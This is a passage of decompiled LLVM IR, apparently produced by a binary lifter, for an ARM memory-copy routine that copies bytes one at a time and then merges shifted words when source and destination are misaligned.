  %v7_15984 = inttoptr i32 %v6_15984 to i8*
  %v8_15984 = load i8, i8* %v7_15984, align 1
  %v9_15984 = zext i8 %v8_15984 to i32
  store i32 %v9_15984, i32* %r3.global-to-local, align 4
  %v11_15984 = add i32 %v6_15984, 1
  store i32 %v11_15984, i32* @r1, align 4
  %v9_15988 = inttoptr i32 %v5_15980 to i8*
  store i8 %v8_15984, i8* %v9_15988, align 1
  %v10_15988 = load i32, i32* @r0, align 4
  %v11_15988 = add i32 %v10_15988, 1
  store i32 %v11_15988, i32* @r0, align 4
  br i1 %v9_15978, label %.thread11, label %bb137

bb137:                                            ; preds = %bb136
  %v8_1598c = load i32, i32* @r1, align 4
  %v9_1598c = inttoptr i32 %v8_1598c to i8*
  %v10_1598c = load i8, i8* %v9_1598c, align 1
  %v11_1598c = zext i8 %v10_1598c to i32
  store i32 %v11_1598c, i32* %r3.global-to-local, align 4
  %v13_1598c = add i32 %v8_1598c, 1
  store i32 %v13_1598c, i32* @r1, align 4
  %v11_15990 = inttoptr i32 %v11_15988 to i8*
  store i8 %v10_1598c, i8* %v11_15990, align 1
  %v12_15990 = load i32, i32* @r0, align 4
  %v13_15990 = add i32 %v12_15990, 1
  store i32 %v13_15990, i32* @r0, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb136, %dec_label_pc_15974, %bb137
  %v0_159ec75 = phi i32 [ %v11_15988, %bb136 ], [ %v5_15980, %dec_label_pc_15974 ], [ %v13_15990, %bb137 ]
  %v0_15994 = load i32, i32* %r2.global-to-local, align 4
  %v1_15994 = load i32, i32* @ip, align 4
  %v2_15994 = sub i32 %v0_15994, %v1_15994
  store i32 %v2_15994, i32* %r2.global-to-local, align 4
  %v4_15994 = xor i32 %v1_15994, %v0_15994
  %v5_15994 = xor i32 %v2_15994, %v0_15994
  %v6_15994 = and i32 %v5_15994, %v4_15994
  %v7_15994 = icmp slt i32 %v6_15994, 0
  store i1 %v7_15994, i1* %cpsr_v.global-to-local, align 1
  %v8_15994 = icmp slt i32 %v2_15994, 0
  store i1 %v8_15994, i1* %cpsr_n.global-to-local, align 1
  %v9_15994 = icmp eq i32 %v0_15994, %v1_15994
  store i1 %v9_15994, i1* %cpsr_z.global-to-local, align 1
  %v5_15998 = icmp slt i32 %v0_15994, %v1_15994
  br i1 %v5_15998, label %bb131, label %dec_label_pc_1599c

dec_label_pc_1599c:                               ; preds = %.thread11
  %v0_1599c = load i32, i32* @r1, align 4
  %v1_1599c = urem i32 %v0_1599c, 4
  store i32 %v1_1599c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1599c = icmp eq i32 %v1_1599c, 0
  store i1 %v2_1599c, i1* %cpsr_z.global-to-local, align 1
  %extract.t123 = trunc i32 %v0_1599c to i2
  br i1 %v2_1599c, label %dec_label_pc_158d8, label %dec_label_pc_159a4

dec_label_pc_159a4:                               ; preds = %dec_label_pc_158d0, %dec_label_pc_1599c
  %v0_159ec74 = phi i32 [ %v1_158b0, %dec_label_pc_158d0 ], [ %v0_159ec75, %dec_label_pc_1599c ]
  %v0_15a98 = phi i32 [ %v2_158c0, %dec_label_pc_158d0 ], [ %v2_15994, %dec_label_pc_1599c ]
  %v0_159ac.off0 = phi i2 [ %extract.t, %dec_label_pc_158d0 ], [ %extract.t123, %dec_label_pc_1599c ]
  %v0_159a4 = phi i32 [ %v0_158b0, %dec_label_pc_158d0 ], [ %v0_1599c, %dec_label_pc_1599c ]
  %v1_159a4 = and i32 %v0_159a4, -4
  store i32 %v1_159a4, i32* %r1.global-to-local, align 4
  %v1_159a8 = inttoptr i32 %v1_159a4 to i32*
  %v2_159a8 = load i32, i32* %v1_159a8, align 4
  store i32 %v2_159a8, i32* @lr, align 4
  %v4_159a8 = add i32 %v1_159a4, 4
  store i32 %v4_159a8, i32* %r1.global-to-local, align 4
  %v2_15a90 = add i32 %v0_15a98, -12
  %v4_15a90 = sub i32 11, %v0_15a98
  %v5_15a90 = and i32 %v4_15a90, %v0_15a98
  %v6_15a90 = icmp slt i32 %v5_15a90, 0
  store i1 %v6_15a90, i1* %cpsr_v.global-to-local, align 1
  %v7_15a90 = icmp slt i32 %v2_15a90, 0
  store i1 %v7_15a90, i1* %cpsr_n.global-to-local, align 1
  %v8_15a90 = icmp eq i32 %v0_15a98, 12
  store i1 %v8_15a90, i1* %cpsr_z.global-to-local, align 1
  %v5_15a94 = icmp slt i32 %v0_15a98, 12
  switch i2 %v0_159ac.off0, label %dec_label_pc_159b8 [
    i2 -1, label %dec_label_pc_15a90
    i2 -2, label %dec_label_pc_15a24
  ]

dec_label_pc_159b8:                               ; preds = %dec_label_pc_159a4
  br i1 %v5_15a94, label %dec_label_pc_15a04, label %dec_label_pc_159c0

dec_label_pc_159c0:                               ; preds = %dec_label_pc_159b8
  store i32 %v2_15a90, i32* %r2.global-to-local, align 4
  %v3_159c4 = load i32, i32* @r4, align 4
  store i32 %v3_159c4, i32* %stack_var_-16, align 4
  %v6_159c4 = load i32, i32* @r5, align 4
  store i32 %v6_159c4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_159c8

dec_label_pc_159c8:                               ; preds = %dec_label_pc_159c8.dec_label_pc_159c8_crit_edge, %dec_label_pc_159c0
  %v0_159ec = phi i32 [ %v12_159ec, %dec_label_pc_159c8.dec_label_pc_159c8_crit_edge ], [ %v0_159ec74, %dec_label_pc_159c0 ]
  %v0_159cc = phi i32 [ %v0_159cc.pre, %dec_label_pc_159c8.dec_label_pc_159c8_crit_edge ], [ %v4_159a8, %dec_label_pc_159c0 ]
  %v0_159c8 = phi i32 [ %v0_159c8.pre, %dec_label_pc_159c8.dec_label_pc_159c8_crit_edge ], [ %v2_159a8, %dec_label_pc_159c0 ]
  %v3_159c8 = udiv i32 %v0_159c8, 256
  store i32 %v3_159c8, i32* %r3.global-to-local, align 4
  %v1_159cc = inttoptr i32 %v0_159cc to i32*
  %v2_159cc = load i32, i32* %v1_159cc, align 4
  store i32 %v2_159cc, i32* %r4.global-to-local, align 4
  %v3_159cc = add i32 %v0_159cc, 4
  %v4_159cc = inttoptr i32 %v3_159cc to i32*
  %v5_159cc = load i32, i32* %v4_159cc, align 4
  store i32 %v5_159cc, i32* %r5.global-to-local, align 4
  %v6_159cc = add i32 %v0_159cc, 8
  %v7_159cc = inttoptr i32 %v6_159cc to i32*
  %v8_159cc = load i32, i32* %v7_159cc, align 4
  store i32 %v8_159cc, i32* %ip.global-to-local, align 4
  %v9_159cc = add i32 %v0_159cc, 12
  %v10_159cc = inttoptr i32 %v9_159cc to i32*
  %v11_159cc = load i32, i32* %v10_159cc, align 4
  store i32 %v11_159cc, i32* @lr, align 4
  %v12_159cc = add i32 %v0_159cc, 16
  store i32 %v12_159cc, i32* %r1.global-to-local, align 4
  %v4_159d0 = mul i32 %v2_159cc, 16777216
  %v5_159d0 = or i32 %v4_159d0, %v3_159c8
  store i32 %v5_159d0, i32* %r3.global-to-local, align 4
  %v3_159d4 = udiv i32 %v2_159cc, 256
  %v4_159d8 = mul i32 %v5_159cc, 16777216
  %v5_159d8 = or i32 %v4_159d8, %v3_159d4
  store i32 %v5_159d8, i32* %r4.global-to-local, align 4
  %v3_159dc = udiv i32 %v5_159cc, 256
  %v4_159e0 = mul i32 %v8_159cc, 16777216
  %v5_159e0 = or i32 %v4_159e0, %v3_159dc
  store i32 %v5_159e0, i32* %r5.global-to-local, align 4
  %v3_159e4 = udiv i32 %v8_159cc, 256
  %v4_159e8 = mul i32 %v11_159cc, 16777216
  %v5_159e8 = or i32 %v4_159e8, %v3_159e4
  store i32 %v5_159e8, i32* @ip, align 4
  %v1_159ec = inttoptr i32 %v0_159ec to i32*
  store i32 %v5_159d0, i32* %v1_159ec, align 4
  %v3_159ec = add i32 %v0_159ec, 4
  %v4_159ec = inttoptr i32 %v3_159ec to i32*
  %v5_159ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_159ec, i32* %v4_159ec, align 4
  %v6_159ec = add i32 %v0_159ec, 8
  %v7_159ec = inttoptr i32 %v6_159ec to i32*
  %v8_159ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_159ec, i32* %v7_159ec, align 4
  %v9_159ec = add i32 %v0_159ec, 12
  %v10_159ec = inttoptr i32 %v9_159ec to i32*
  %v11_159ec = load i32, i32* @ip, align 4
  store i32 %v11_159ec, i32* %v10_159ec, align 4
  %v12_159ec = add i32 %v0_159ec, 16
  store i32 %v12_159ec, i32* @r0, align 4
  %v0_159f0 = load i32, i32* %r2.global-to-local, align 4
  %v2_159f0 = add i32 %v0_159f0, -16
  store i32 %v2_159f0, i32* %r2.global-to-local, align 4
  %v6_159f4 = icmp slt i32 %v0_159f0, 16
  br i1 %v6_159f4, label %dec_label_pc_159f8, label %dec_label_pc_159c8.dec_label_pc_159c8_crit_edge

dec_label_pc_159c8.dec_label_pc_159c8_crit_edge:  ; preds = %dec_label_pc_159c8
  %v0_159c8.pre = load i32, i32* @lr, align 4
  %v0_159cc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_159c8

dec_label_pc_159f8:                               ; preds = %dec_label_pc_159c8
  %v2_159f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_159f8, i32* @r4, align 4
  %v5_159f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_159f8, i32* @r5, align 4
  %v2_159fc = add i32 %v0_159f0, -4
  store i32 %v2_159fc, i32* %r2.global-to-local, align 4
  %v4_159fc = add i32 %v0_159f0, 2147483632
  %v5_159fc = and i32 %v2_159fc, %v4_159fc
  %v6_159fc = icmp slt i32 %v5_159fc, 0
  store i1 %v6_159fc, i1* %cpsr_v.global-to-local, align 1
  %v7_159fc = icmp slt i32 %v2_159fc, 0
  store i1 %v7_159fc, i1* %cpsr_n.global-to-local, align 1
  %v8_159fc = icmp eq i32 %v2_159fc, 0
  store i1 %v8_159fc, i1* %cpsr_z.global-to-local, align 1
  %v5_15a00 = icmp slt i32 %v2_159f0, -12
  br i1 %v5_15a00, label %dec_label_pc_15a1c, label %dec_label_pc_15a04

dec_label_pc_15a04:                               ; preds = %dec_label_pc_159f8, %dec_label_pc_159b8, %dec_label_pc_15a04
  %v1_15a10 = phi i32 [ %v4_15a10, %dec_label_pc_15a04 ], [ %v12_159ec, %dec_label_pc_159f8 ], [ %v0_159ec74, %dec_label_pc_159b8 ]
  %v0_15a04 = load i32, i32* @lr, align 4
  %v3_15a04 = udiv i32 %v0_15a04, 256
  store i32 %v3_15a04, i32* %ip.global-to-local, align 4
  %v0_15a08 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a08 = inttoptr i32 %v0_15a08 to i32*
  %v2_15a08 = load i32, i32* %v1_15a08, align 4
  store i32 %v2_15a08, i32* @lr, align 4
  %v4_15a08 = add i32 %v0_15a08, 4
  store i32 %v4_15a08, i32* %r1.global-to-local, align 4
  %v4_15a0c = mul i32 %v2_15a08, 16777216
  %v5_15a0c = or i32 %v4_15a0c, %v3_15a04
  store i32 %v5_15a0c, i32* @ip, align 4
  %v2_15a10 = inttoptr i32 %v1_15a10 to i32*
  store i32 %v5_15a0c, i32* %v2_15a10, align 4
  %v3_15a10 = load i32, i32* @r0, align 4
  %v4_15a10 = add i32 %v3_15a10, 4
  store i32 %v4_15a10, i32* @r0, align 4
  %v0_15a14 = load i32, i32* %r2.global-to-local, align 4
  %v2_15a14 = add i32 %v0_15a14, -4
  store i32 %v2_15a14, i32* %r2.global-to-local, align 4
  %v6_15a18 = icmp slt i32 %v0_15a14, 4
  br i1 %v6_15a18, label %dec_label_pc_15a1c.loopexit, label %dec_label_pc_15a04

dec_label_pc_15a1c.loopexit:                      ; preds = %dec_label_pc_15a04
  %v4_15a14 = sub i32 3, %v0_15a14
  %v5_15a14 = and i32 %v4_15a14, %v0_15a14
  %v6_15a14 = icmp slt i32 %v5_15a14, 0
  %v7_15a14 = icmp slt i32 %v2_15a14, 0
  store i1 %v6_15a14, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15a14, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15a1c

dec_label_pc_15a1c:                               ; preds = %dec_label_pc_15a1c.loopexit, %dec_label_pc_159f8
  %v2_1595c111 = phi i32 [ %v4_15a10, %dec_label_pc_15a1c.loopexit ], [ %v12_159ec, %dec_label_pc_159f8 ]
  %v0_1594c107 = phi i32 [ %v2_15a14, %dec_label_pc_15a1c.loopexit ], [ %v2_159fc, %dec_label_pc_159f8 ]
  %v0_15a1c = load i32, i32* %r1.global-to-local, align 4
  %v1_15a1c = add i32 %v0_15a1c, -3
  store i32 %v1_15a1c, i32* @r1, align 4
  br label %bb131

dec_label_pc_15a24:                               ; preds = %dec_label_pc_159a4
  br i1 %v5_15a94, label %dec_label_pc_15a70, label %dec_label_pc_15a2c

dec_label_pc_15a2c:                               ; preds = %dec_label_pc_15a24
  store i32 %v2_15a90, i32* %r2.global-to-local, align 4
  %v3_15a30 = load i32, i32* @r4, align 4
  store i32 %v3_15a30, i32* %stack_var_-16, align 4
  %v6_15a30 = load i32, i32* @r5, align 4
  store i32 %v6_15a30, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15a34

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a34.dec_label_pc_15a34_crit_edge, %dec_label_pc_15a2c
  %v0_15a58 = phi i32 [ %v12_15a58, %dec_label_pc_15a34.dec_label_pc_15a34_crit_edge ], [ %v0_159ec74, %dec_label_pc_15a2c ]
  %v0_15a38 = phi i32 [ %v0_15a38.pre, %dec_label_pc_15a34.dec_label_pc_15a34_crit_edge ], [ %v4_159a8, %dec_label_pc_15a2c ]
  %v0_15a34 = phi i32 [ %v0_15a34.pre, %dec_label_pc_15a34.dec_label_pc_15a34_crit_edge ], [ %v2_159a8, %dec_label_pc_15a2c ]
  %v3_15a34 = udiv i32 %v0_15a34, 65536
  store i32 %v3_15a34, i32* %r3.global-to-local, align 4
  %v1_15a38 = inttoptr i32 %v0_15a38 to i32*
  %v2_15a38 = load i32, i32* %v1_15a38, align 4
  store i32 %v2_15a38, i32* %r4.global-to-local, align 4
  %v3_15a38 = add i32 %v0_15a38, 4
  %v4_15a38 = inttoptr i32 %v3_15a38 to i32*
  %v5_15a38 = load i32, i32* %v4_15a38, align 4
  store i32 %v5_15a38, i32* %r5.global-to-local, align 4
  %v6_15a38 = add i32 %v0_15a38, 8
  %v7_15a38 = inttoptr i32 %v6_15a38 to i32*
  %v8_15a38 = load i32, i32* %v7_15a38, align 4
  store i32 %v8_15a38, i32* %ip.global-to-local, align 4
  %v9_15a38 = add i32 %v0_15a38, 12
  %v10_15a38 = inttoptr i32 %v9_15a38 to i32*
  %v11_15a38 = load i32, i32* %v10_15a38, align 4
  store i32 %v11_15a38, i32* @lr, align 4
  %v12_15a38 = add i32 %v0_15a38, 16
  store i32 %v12_15a38, i32* %r1.global-to-local, align 4
  %v4_15a3c = mul i32 %v2_15a38, 65536
  %v5_15a3c = or i32 %v4_15a3c, %v3_15a34
  store i32 %v5_15a3c, i32* %r3.global-to-local, align 4
  %v3_15a40 = udiv i32 %v2_15a38, 65536
  %v4_15a44 = mul i32 %v5_15a38, 65536
  %v5_15a44 = or i32 %v4_15a44, %v3_15a40
  store i32 %v5_15a44, i32* %r4.global-to-local, align 4
  %v3_15a48 = udiv i32 %v5_15a38, 65536
  %v4_15a4c = mul i32 %v8_15a38, 65536
  %v5_15a4c = or i32 %v4_15a4c, %v3_15a48
  store i32 %v5_15a4c, i32* %r5.global-to-local, align 4
  %v3_15a50 = udiv i32 %v8_15a38, 65536
  %v4_15a54 = mul i32 %v11_15a38, 65536
  %v5_15a54 = or i32 %v4_15a54, %v3_15a50
  store i32 %v5_15a54, i32* @ip, align 4
  %v1_15a58 = inttoptr i32 %v0_15a58 to i32*
  store i32 %v5_15a3c, i32* %v1_15a58, align 4
  %v3_15a58 = add i32 %v0_15a58, 4
  %v4_15a58 = inttoptr i32 %v3_15a58 to i32*
  %v5_15a58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15a58, i32* %v4_15a58, align 4
  %v6_15a58 = add i32 %v0_15a58, 8
  %v7_15a58 = inttoptr i32 %v6_15a58 to i32*
  %v8_15a58 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15a58, i32* %v7_15a58, align 4
  %v9_15a58 = add i32 %v0_15a58, 12
  %v10_15a58 = inttoptr i32 %v9_15a58 to i32*
  %v11_15a58 = load i32, i32* @ip, align 4
  store i32 %v11_15a58, i32* %v10_15a58, align 4
  %v12_15a58 = add i32 %v0_15a58, 16
  store i32 %v12_15a58, i32* @r0, align 4
  %v0_15a5c = load i32, i32* %r2.global-to-local, align 4
  %v2_15a5c = add i32 %v0_15a5c, -16
  store i32 %v2_15a5c, i32* %r2.global-to-local, align 4
  %v6_15a60 = icmp slt i32 %v0_15a5c, 16
  br i1 %v6_15a60, label %dec_label_pc_15a64, label %dec_label_pc_15a34.dec_label_pc_15a34_crit_edge

dec_label_pc_15a34.dec_label_pc_15a34_crit_edge:  ; preds = %dec_label_pc_15a34
  %v0_15a34.pre = load i32, i32* @lr, align 4
  %v0_15a38.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15a34

dec_label_pc_15a64:                               ; preds = %dec_label_pc_15a34
  %v2_15a64 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15a64, i32* @r4, align 4
  %v5_15a64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15a64, i32* @r5, align 4
  %v2_15a68 = add i32 %v0_15a5c, -4
  store i32 %v2_15a68, i32* %r2.global-to-local, align 4
  %v4_15a68 = add i32 %v0_15a5c, 2147483632
  %v5_15a68 = and i32 %v2_15a68, %v4_15a68
  %v6_15a68 = icmp slt i32 %v5_15a68, 0
  store i1 %v6_15a68, i1* %cpsr_v.global-to-local, align 1
  %v7_15a68 = icmp slt i32 %v2_15a68, 0
  store i1 %v7_15a68, i1* %cpsr_n.global-to-local, align 1
  %v8_15a68 = icmp eq i32 %v2_15a68, 0
  store i1 %v8_15a68, i1* %cpsr_z.global-to-local, align 1
  %v5_15a6c = icmp slt i32 %v2_15a5c, -12
  br i1 %v5_15a6c, label %dec_label_pc_15a88, label %dec_label_pc_15a70

dec_label_pc_15a70:                               ; preds = %dec_label_pc_15a64, %dec_label_pc_15a24, %dec_label_pc_15a70
  %v1_15a7c = phi i32 [ %v4_15a7c, %dec_label_pc_15a70 ], [ %v12_15a58, %dec_label_pc_15a64 ], [ %v0_159ec74, %dec_label_pc_15a24 ]
  %v0_15a70 = load i32, i32* @lr, align 4
  %v3_15a70 = udiv i32 %v0_15a70, 65536
  store i32 %v3_15a70, i32* %ip.global-to-local, align 4
  %v0_15a74 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a74 = inttoptr i32 %v0_15a74 to i32*
  %v2_15a74 = load i32, i32* %v1_15a74, align 4
  store i32 %v2_15a74, i32* @lr, align 4
  %v4_15a74 = add i32 %v0_15a74, 4
  store i32 %v4_15a74, i32* %r1.global-to-local, align 4
  %v4_15a78 = mul i32 %v2_15a74, 65536
  %v5_15a78 = or i32 %v4_15a78, %v3_15a70
  store i32 %v5_15a78, i32* @ip, align 4
  %v2_15a7c = inttoptr i32 %v1_15a7c to i32*
  store i32 %v5_15a78, i32* %v2_15a7c, align 4
  %v3_15a7c = load i32, i32* @r0, align 4
  %v4_15a7c = add i32 %v3_15a7c, 4
  store i32 %v4_15a7c, i32* @r0, align 4
  %v0_15a80 = load i32, i32* %r2.global-to-local, align 4
  %v2_15a80 = add i32 %v0_15a80, -4
  store i32 %v2_15a80, i32* %r2.global-to-local, align 4
  %v6_15a84 = icmp slt i32 %v0_15a80, 4
  br i1 %v6_15a84, label %dec_label_pc_15a88.loopexit, label %dec_label_pc_15a70

dec_label_pc_15a88.loopexit:                      ; preds = %dec_label_pc_15a70
  %v4_15a80 = sub i32 3, %v0_15a80
  %v5_15a80 = and i32 %v4_15a80, %v0_15a80
  %v6_15a80 = icmp slt i32 %v5_15a80, 0
  %v7_15a80 = icmp slt i32 %v2_15a80, 0
  store i1 %v6_15a80, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15a80, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15a88

dec_label_pc_15a88:                               ; preds = %dec_label_pc_15a88.loopexit, %dec_label_pc_15a64
  %v2_1595c112 = phi i32 [ %v4_15a7c, %dec_label_pc_15a88.loopexit ], [ %v12_15a58, %dec_label_pc_15a64 ]
  %v0_1594c108 = phi i32 [ %v2_15a80, %dec_label_pc_15a88.loopexit ], [ %v2_15a68, %dec_label_pc_15a64 ]
  %v0_15a88 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a88 = add i32 %v0_15a88, -2
  store i32 %v1_15a88, i32* @r1, align 4
  br label %bb131

dec_label_pc_15a90:                               ; preds = %dec_label_pc_159a4
  br i1 %v5_15a94, label %dec_label_pc_15adc, label %dec_label_pc_15a98

dec_label_pc_15a98:                               ; preds = %dec_label_pc_15a90
  store i32 %v2_15a90, i32* %r2.global-to-local, align 4
  %v3_15a9c = load i32, i32* @r4, align 4
  store i32 %v3_15a9c, i32* %stack_var_-16, align 4
  %v6_15a9c = load i32, i32* @r5, align 4
  store i32 %v6_15a9c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15aa0

dec_label_pc_15aa0:                               ; preds = %dec_label_pc_15aa0.dec_label_pc_15aa0_crit_edge, %dec_label_pc_15a98
  %v0_15ac4 = phi i32 [ %v12_15ac4, %dec_label_pc_15aa0.dec_label_pc_15aa0_crit_edge ], [ %v0_159ec74, %dec_label_pc_15a98 ]
  %v0_15aa4 = phi i32 [ %v0_15aa4.pre, %dec_label_pc_15aa0.dec_label_pc_15aa0_crit_edge ], [ %v4_159a8, %dec_label_pc_15a98 ]
  %v0_15aa0 = phi i32 [ %v0_15aa0.pre, %dec_label_pc_15aa0.dec_label_pc_15aa0_crit_edge ], [ %v2_159a8, %dec_label_pc_15a98 ]
  %v3_15aa0 = udiv i32 %v0_15aa0, 16777216
  store i32 %v3_15aa0, i32* %r3.global-to-local, align 4
  %v1_15aa4 = inttoptr i32 %v0_15aa4 to i32*
  %v2_15aa4 = load i32, i32* %v1_15aa4, align 4
  store i32 %v2_15aa4, i32* %r4.global-to-local, align 4
  %v3_15aa4 = add i32 %v0_15aa4, 4
  %v4_15aa4 = inttoptr i32 %v3_15aa4 to i32*
  %v5_15aa4 = load i32, i32* %v4_15aa4, align 4
  store i32 %v5_15aa4, i32* %r5.global-to-local, align 4
  %v6_15aa4 = add i32 %v0_15aa4, 8
  %v7_15aa4 = inttoptr i32 %v6_15aa4 to i32*
  %v8_15aa4 = load i32, i32* %v7_15aa4, align 4
  store i32 %v8_15aa4, i32* %ip.global-to-local, align 4
  %v9_15aa4 = add i32 %v0_15aa4, 12
  %v10_15aa4 = inttoptr i32 %v9_15aa4 to i32*
  %v11_15aa4 = load i32, i32* %v10_15aa4, align 4
  store i32 %v11_15aa4, i32* @lr, align 4
  %v12_15aa4 = add i32 %v0_15aa4, 16
  store i32 %v12_15aa4, i32* %r1.global-to-local, align 4
  %v4_15aa8 = mul i32 %v2_15aa4, 256
  %v5_15aa8 = or i32 %v4_15aa8, %v3_15aa0
  store i32 %v5_15aa8, i32* %r3.global-to-local, align 4
  %v3_15aac = udiv i32 %v2_15aa4, 16777216
  %v4_15ab0 = mul i32 %v5_15aa4, 256
  %v5_15ab0 = or i32 %v4_15ab0, %v3_15aac
  store i32 %v5_15ab0, i32* %r4.global-to-local, align 4
  %v3_15ab4 = udiv i32 %v5_15aa4, 16777216
  %v4_15ab8 = mul i32 %v8_15aa4, 256
  %v5_15ab8 = or i32 %v4_15ab8, %v3_15ab4
  store i32 %v5_15ab8, i32* %r5.global-to-local, align 4
  %v3_15abc = udiv i32 %v8_15aa4, 16777216
  %v4_15ac0 = mul i32 %v11_15aa4, 256
  %v5_15ac0 = or i32 %v4_15ac0, %v3_15abc
  store i32 %v5_15ac0, i32* @ip, align 4
  %v1_15ac4 = inttoptr i32 %v0_15ac4 to i32*
  store i32 %v5_15aa8, i32* %v1_15ac4, align 4
  %v3_15ac4 = add i32 %v0_15ac4, 4
  %v4_15ac4 = inttoptr i32 %v3_15ac4 to i32*
  %v5_15ac4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15ac4, i32* %v4_15ac4, align 4
  %v6_15ac4 = add i32 %v0_15ac4, 8
  %v7_15ac4 = inttoptr i32 %v6_15ac4 to i32*
  %v8_15ac4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15ac4, i32* %v7_15ac4, align 4
  %v9_15ac4 = add i32 %v0_15ac4, 12
  %v10_15ac4 = inttoptr i32 %v9_15ac4 to i32*
  %v11_15ac4 = load i32, i32* @ip, align 4
  store i32 %v11_15ac4, i32* %v10_15ac4, align 4
  %v12_15ac4 = add i32 %v0_15ac4, 16
  store i32 %v12_15ac4, i32* @r0, align 4
  %v0_15ac8 = load i32, i32* %r2.global-to-local, align 4
  %v2_15ac8 = add i32 %v0_15ac8, -16
  store i32 %v2_15ac8, i32* %r2.global-to-local, align 4
  %v6_15acc = icmp slt i32 %v0_15ac8, 16
  br i1 %v6_15acc, label %dec_label_pc_15ad0, label %dec_label_pc_15aa0.dec_label_pc_15aa0_crit_edge

dec_label_pc_15aa0.dec_label_pc_15aa0_crit_edge:  ; preds = %dec_label_pc_15aa0
  %v0_15aa0.pre = load i32, i32* @lr, align 4
  %v0_15aa4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15aa0

dec_label_pc_15ad0:                               ; preds = %dec_label_pc_15aa0
  %v2_15ad0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15ad0, i32* @r4, align 4
  %v5_15ad0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15ad0, i32* @r5, align 4
  %v2_15ad4 = add i32 %v0_15ac8, -4
  store i32 %v2_15ad4, i32* %r2.global-to-local, align 4
  %v4_15ad4 = add i32 %v0_15ac8, 2147483632
  %v5_15ad4 = and i32 %v2_15ad4, %v4_15ad4
  %v6_15ad4 = icmp slt i32 %v5_15ad4, 0
  store i1 %v6_15ad4, i1* %cpsr_v.global-to-local, align 1
  %v7_15ad4 = icmp slt i32 %v2_15ad4, 0
  store i1 %v7_15ad4, i1* %cpsr_n.global-to-local, align 1
  %v8_15ad4 = icmp eq i32 %v2_15ad4, 0
  store i1 %v8_15ad4, i1* %cpsr_z.global-to-local, align 1
  %v5_15ad8 = icmp slt i32 %v2_15ac8, -12
  br i1 %v5_15ad8, label %dec_label_pc_15af4, label %dec_label_pc_15adc

dec_label_pc_15adc:                               ; preds = %dec_label_pc_15ad0, %dec_label_pc_15a90, %dec_label_pc_15adc
  %v1_15ae8 = phi i32 [ %v4_15ae8, %dec_label_pc_15adc ], [ %v12_15ac4, %dec_label_pc_15ad0 ], [ %v0_159ec74, %dec_label_pc_15a90 ]
  %v0_15adc = load i32, i32* @lr, align 4
  %v3_15adc = udiv i32 %v0_15adc, 16777216
  store i32 %v3_15adc, i32* %ip.global-to-local, align 4
  %v0_15ae0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ae0 = inttoptr i32 %v0_15ae0 to i32*
  %v2_15ae0 = load i32, i32* %v1_15ae0, align 4
  store i32 %v2_15ae0, i32* @lr, align 4
  %v4_15ae0 = add i32 %v0_15ae0, 4
  store i32 %v4_15ae0, i32* %r1.global-to-local, align 4
  %v4_15ae4 = mul i32 %v2_15ae0, 256
  %v5_15ae4 = or i32 %v4_15ae4, %v3_15adc
  store i32 %v5_15ae4, i32* @ip, align 4
  %v2_15ae8 = inttoptr i32 %v1_15ae8 to i32*
  store i32 %v5_15ae4, i32* %v2_15ae8, align 4
  %v3_15ae8 = load i32, i32* @r0, align 4
  %v4_15ae8 = add i32 %v3_15ae8, 4
  store i32 %v4_15ae8, i32* @r0, align 4
  %v0_15aec = load i32, i32* %r2.global-to-local, align 4
  %v2_15aec = add i32 %v0_15aec, -4
  store i32 %v2_15aec, i32* %r2.global-to-local, align 4
  %v6_15af0 = icmp slt i32 %v0_15aec, 4
  br i1 %v6_15af0, label %dec_label_pc_15af4.loopexit, label %dec_label_pc_15adc

dec_label_pc_15af4.loopexit:                      ; preds = %dec_label_pc_15adc
  %v4_15aec = sub i32 3, %v0_15aec
  %v5_15aec = and i32 %v4_15aec, %v0_15aec
  %v6_15aec = icmp slt i32 %v5_15aec, 0
  %v7_15aec = icmp slt i32 %v2_15aec, 0
  store i1 %v6_15aec, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15aec, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15af4

dec_label_pc_15af4:                               ; preds = %dec_label_pc_15af4.loopexit, %dec_label_pc_15ad0
  %v2_1595c113 = phi i32 [ %v4_15ae8, %dec_label_pc_15af4.loopexit ], [ %v12_15ac4, %dec_label_pc_15ad0 ]
  %v0_1594c109 = phi i32 [ %v2_15aec, %dec_label_pc_15af4.loopexit ], [ %v2_15ad4, %dec_label_pc_15ad0 ]
  %v0_15af4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15af4 = add i32 %v0_15af4, -1
  store i32 %v1_15af4, i32* @r1, align 4
  br label %bb131

dec_label_pc_15afc:                               ; preds = %dec_label_pc_158b0
  %v1_15afc = load i32, i32* @r2, align 4
  %v2_15afc = add i32 %v1_15afc, %v0_158b0
  store i32 %v2_15afc, i32* %r1.global-to-local, align 4
  %v2_15b00 = add i32 %v1_15afc, %v1_158b0
